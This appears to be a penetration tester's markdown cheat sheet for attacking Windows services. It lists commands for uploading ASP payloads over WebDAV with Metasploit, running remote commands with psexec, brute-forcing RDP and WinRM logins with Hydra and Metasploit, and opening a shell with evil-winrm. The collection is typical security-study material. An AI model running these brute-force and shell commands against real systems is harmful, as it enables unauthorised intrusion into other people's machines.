# Windows

## Webdav

### `davtest`&#x20;

* to scan the webdav..... type in the directory path to the tool :&#x20;

```bash
davtest -url http://$IP/webdav -auth username:password
```

### cadaver

* to interact with the server (ie. to put,download, etc) files.

```bash
cadaver http://$IP/dir #dir = webdav directory 
```

### metasploit&#x20;

* exploiting with msfconsole (automating davtest + cadaver)

```bash
exploit/windows/iis/iis_webdav_upload_asp 

#note if extension allowed is different this wont work
#only works if asp is executable on the server
# to check what extensions are executable ...... use davtest

set HttpPassword $username
set HttpUsername $password
set RHOSTS $IP
set PATH /webdav_dir/random_name.asp
```



## psexec

* [https://github.com/fortra/impacket/blob/master/examples/psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
* used to run cmd in windows via samba (smb)

```bash
psexec.py username@ip <cmd> #cmd.exe
```



## RDP

* what is rdp?

{% embed url="https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/" %}

* some tricks to pentest

{% embed url="https://hacktricks.boitatech.com.br/pentesting/pentesting-rdp" %}

### msfconsole

* to scan if a port is running rdp or not

```bash
use auxiliary/scanner/rdp/rdp_scanner

set rhosts $IP
set rport $port
run
```



### hydra

* bruteforce rdp

```bash
hydra -L /path/to/users.txt -P /path/to/wordlists.txt rdp://$IP:$PORT/
```



## xfreerdp

* connect to rdp port&#x20;

```bash
xfreerdp /u:$username /p:$password /v:$IP:$PORT
```



## Winrm

### msfconsole

* bruteforce winrm

```bash
use auxiliary/scanner/winrm/winrm_login

set RHOSTS $IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwd.txt
```

### evil-winrm

* connect & get shell

```bash
evil-winrm.rb -u $user -p '$passwd' -i $IP
```























